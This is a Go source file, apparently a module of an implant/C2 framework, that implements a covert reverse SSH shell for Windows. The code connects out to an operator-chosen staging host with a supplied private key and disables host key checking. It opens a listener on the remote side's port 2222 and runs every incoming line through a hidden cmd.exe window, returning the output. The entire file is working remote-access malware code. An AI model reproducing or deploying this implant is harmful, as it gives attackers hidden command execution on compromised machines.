// +build windows


package biterpreter

import (
	
	"bufio"
	"bytes"
	"net"
	"os/exec"
	"syscall"

	"golang.org/x/crypto/ssh"

	//Fixes
	"time"
	"encoding/json"
)
/*
This JSON Object definition is needed in some Implants Modules to decode parameters
Hive will have the same definitions in: ./src/hive/hiveJobs.go
*/
type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
}

/*
Description: Inject Reverse Shell --> Windows
Flow:
A.Use golang ssh native library to spawn a ssh client that connects to a target staging
	A1.Use provided credentials (username and pem key), for the ssh connection
B.This connection will create a listener in 2222 localport of target staging
C.Spawn a cmd process within the foothold, and pipe stdout/stdin through this last opened socket
*/
func RevSshShell(jsonparams string) (bool,string){

	var revsshshellparams *InjectRevSshShellBichito
	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
	if errDaws != nil {
		return true,"Parameters JSON Decoding error:"+errDaws.Error()
	}

	auth, err := loadPrivateKey(revsshshellparams.Sshkey)
	if err != nil {
		return true,"Load Key String error"
	}

	config := &ssh.ClientConfig{
		User: revsshshellparams.User,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":"+revsshshellparams.Port, config)
	if err != nil {
		return true,"Error: error dialing remote host:"+err.Error()
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", "127.0.0.1:2222")
	if err != nil {
		return true,"Error: error listening on remote host:"+err.Error()
	}

	go listenSSH(sshConn,l)

	return false,"Success: Rev SSH Shell Connected to Staging"
}


func listenSSH(sshconn *ssh.Client,l net.Listener){

	defer sshconn.Close()

	// Start accepting shell connections
	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		handleConnection(conn)

		return
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	r := bufio.NewReader(c)
	for{
		order, err := r.ReadString('\n')
		if nil != err {
			return
		}

		var outbuf,errbuf bytes.Buffer

		// Start the command
		cmd := exec.Command("C:\\Windows\\System32\\cmd.exe","/c",order+"\n")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		cmd.Stdout = &outbuf
		cmd.Stderr = &errbuf


		err = cmd.Run()
		if err != nil {
			return
		}

		c.Write([]byte(outbuf.String()))
		c.Write([]byte(errbuf.String()))
	}

}

func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {


	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}